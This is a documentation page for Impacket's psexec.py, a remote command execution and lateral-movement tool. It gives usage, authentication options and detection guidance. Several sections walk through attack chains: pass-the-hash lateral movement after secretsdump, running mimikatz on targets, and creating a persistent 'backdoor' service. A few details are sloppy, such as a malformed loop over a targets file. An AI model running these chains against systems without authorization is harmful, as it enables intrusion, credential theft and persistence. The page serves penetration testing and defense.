# psexec.py

## Overview
`psexec.py` is an Impacket implementation of the famous PsExec tool, providing remote command execution capabilities on Windows systems. It's one of the most widely used lateral movement techniques in penetration testing and red team operations.

## Detailed Description
This tool replicates the functionality of Microsoft's PsExec utility, allowing remote execution of commands on Windows systems through SMB and named pipes. It uploads and executes a service binary on the target system, enabling interactive shell access or single command execution.

### Key Features:
- Remote command execution via SMB
- Interactive shell access
- Single command execution
- Multiple authentication methods (password, hash, Kerberos)
- Service-based execution method
- File upload and execution capabilities
- Support for different execution contexts

### Technical Details:
- Uses SMB protocol for communication
- Creates and starts Windows services remotely
- Leverages named pipes for I/O redirection
- Requires administrative privileges on target
- Uses Service Control Manager (SCM) for execution

## Command Line Options

```
usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts]
                 [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                 [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip] [-target-ip ip]
                 [-port [destination port]] [-service-name service_name]
                 [-remote-binary-name remote_binary_name]
                 target [command ...]

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               Command to execute (if not specified, semi-interactive shell)

Optional Arguments:
  -c                    Copy the file at the UNC path to the target and execute
  -path                 Path where the file will be copied on the target
  -file                 Alternative to -c, specifies local file to upload
  -ts                   Add timestamp to every logging output
  -debug                Turn DEBUG output ON
  -service-name         Service name to create (default: random)
  -remote-binary-name   Remote binary name (default: random)

Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey               AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab               Read keys from keytab file
  -dc-ip                IP Address of the domain controller
  -target-ip            IP Address of the target machine
  -port                 Destination port to connect to SMB Server
```

## Usage Examples

### Basic Remote Shell
```bash
# Interactive shell with password authentication
python3 psexec.py domain.com/administrator:password@target.domain.com

# Interactive shell with hash authentication
python3 psexec.py -hashes :ntlmhash administrator@target.domain.com

# Interactive shell with Kerberos authentication
python3 psexec.py -k domain.com/administrator@target.domain.com -dc-ip 192.168.1.10
```

### Single Command Execution
```bash
# Execute single command
python3 psexec.py domain.com/administrator:password@target.domain.com "whoami"

# Get system information
python3 psexec.py domain.com/administrator:password@target.domain.com "systeminfo"

# List users
python3 psexec.py domain.com/administrator:password@target.domain.com "net user"
```

### File Upload and Execution
```bash
# Upload and execute local file
python3 psexec.py domain.com/administrator:password@target.domain.com -file /path/to/payload.exe

# Copy file from UNC path and execute
python3 psexec.py domain.com/administrator:password@target.domain.com -c \\\\share\\path\\payload.exe

# Specify target path for uploaded file
python3 psexec.py domain.com/administrator:password@target.domain.com -file payload.exe -path C:\\Windows\\Temp\\
```

### Advanced Authentication
```bash
# Use AES key for Kerberos
python3 psexec.py -aesKey 32_char_aes_key domain.com/user@target.domain.com -k

# Use keytab file
python3 psexec.py -keytab user.keytab domain.com/user@target.domain.com -k

# Specify custom service name
python3 psexec.py domain.com/administrator:password@target.domain.com -service-name CustomSvc
```

### Network Options
```bash
# Specify target IP (useful for host header manipulation)
python3 psexec.py domain.com/administrator:password@target.domain.com -target-ip 192.168.1.100

# Use custom SMB port
python3 psexec.py domain.com/administrator:password@target.domain.com -port 445

# Enable debug output
python3 psexec.py domain.com/administrator:password@target.domain.com -debug
```

## Attack Chain Integration

### Initial Lateral Movement
```bash
# Step 1: Obtain credentials via various methods
python3 secretsdump.py domain.com/user:password@dc.domain.com

# Step 2: Use extracted admin hash for lateral movement
python3 psexec.py -hashes :admin_hash administrator@target1.domain.com

# Step 3: Extract more credentials from new target
python3 secretsdump.py -hashes :admin_hash administrator@target1.domain.com
```

### Post-Exploitation Chain
```bash
# Step 1: Gain access via psexec
python3 psexec.py domain.com/administrator:password@target.domain.com

# Commands to run inside psexec shell:
# whoami /priv
# net user /domain
# net group "Domain Admins" /domain
# reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v DumpSecrets
```

### Persistence Establishment
```bash
# Step 1: Access system via psexec
python3 psexec.py domain.com/administrator:password@target.domain.com

# Step 2: Create persistent backdoor (in psexec shell)
# sc create backdoor binPath= "C:\Windows\System32\cmd.exe /c powershell.exe -Command ..."
# sc config backdoor start= auto
# sc start backdoor
```

### Credential Harvesting Chain
```bash
# Step 1: Access multiple systems
for target in targets.txt; do
    python3 psexec.py -hashes :hash administrator@$target "hostname && whoami"
done

# Step 2: Run mimikatz on each system
python3 psexec.py -hashes :hash administrator@target.domain.com -file mimikatz.exe

# Step 3: Collect results
python3 psexec.py -hashes :hash administrator@target.domain.com "type C:\temp\output.txt"
```

## Interactive Shell Commands

### Common Commands in PsExec Shell
```cmd
# System information
systeminfo
whoami /all
hostname

# Network information
ipconfig /all
netstat -an
arp -a

# Domain information
net user /domain
net group /domain
net group "Domain Admins" /domain

# Local information
net user
net localgroup administrators
wmic service list brief

# File operations
dir C:\Users\
type C:\Windows\System32\drivers\etc\hosts
copy file1.txt file2.txt
```

### PowerShell Execution
```cmd
# Execute PowerShell commands
powershell.exe -Command "Get-Process"
powershell.exe -Command "Get-Service"
powershell.exe -ExecutionPolicy Bypass -File script.ps1
```

## Prerequisites
- Administrative credentials on target system
- SMB access to target (port 445)
- Windows target system
- Network connectivity between attacker and target
- Appropriate privileges to create and start services

## Detection Considerations
- **Event ID 7045**: Service was installed on the system
- **Event ID 4697**: Service was installed on the system
- **Process Creation**: Unusual service processes with random names
- **Network Indicators**: SMB connections to ADMIN$ and IPC$ shares
- **File Indicators**: Temporary executables in system directories
- **Service Indicators**: Services with random names or unusual paths

## Defensive Measures
- **Disable ADMIN$ Share**: Remove administrative shares where possible
- **Service Monitoring**: Monitor service creation and execution
- **Network Segmentation**: Limit SMB access between systems
- **Privileged Access Management**: Control administrative account usage
- **Application Whitelisting**: Prevent unauthorized executable execution
- **Logging Enhancement**: Enable detailed service and process logging
- **Lateral Movement Detection**: Implement tools to detect lateral movement patterns

## Common Issues and Troubleshooting

### Access Denied Errors
```bash
# Ensure user has administrative privileges
net user username /domain

# Check if target allows remote admin
reg query \\target\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
```

### Network Connectivity Issues
```bash
# Test SMB connectivity
smbclient -L //target.domain.com -U user%password

# Test with Impacket smbclient
python3 smbclient.py domain.com/user:password@target.domain.com
```

### Service Creation Failures
```bash
# Check service permissions
sc \\target query type= service state= all

# Verify admin share access
net use \\target\ADMIN$ /user:domain\user password
```

## Alternative Execution Methods
When psexec fails, consider these alternatives:
- [wmiexec.py](wmiexec.md) - WMI-based execution
- [smbexec.py](smbexec.md) - SMB-based execution without services
- [dcomexec.py](dcomexec.md) - DCOM-based execution
- [atexec.py](atexec.md) - Scheduled task execution

## Related Tools
- [smbexec.py](smbexec.md) - Alternative SMB-based execution
- [wmiexec.py](wmiexec.md) - WMI-based remote execution
- [secretsdump.py](secretsdump.md) - Credential extraction for authentication
- [smbclient.py](smbclient.md) - SMB client for file operations
- [services.py](services.md) - Remote service management
